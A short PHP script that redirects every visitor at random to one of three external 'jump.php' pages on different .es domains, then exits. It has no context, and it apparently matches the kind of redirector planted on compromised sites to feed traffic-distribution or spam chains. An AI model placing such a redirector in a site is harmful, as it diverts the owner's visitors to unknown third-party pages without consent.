<?php
$go = [
    'https://tr3x.es/jump.php',
    'https://pepesegura.es/jump.php',
    'https://suno.moozak.es/jump.php'
    ];
$random = rand(0,count($go)-1);
$url = "Location: " . $go[$random];
header($url);
die();
?>

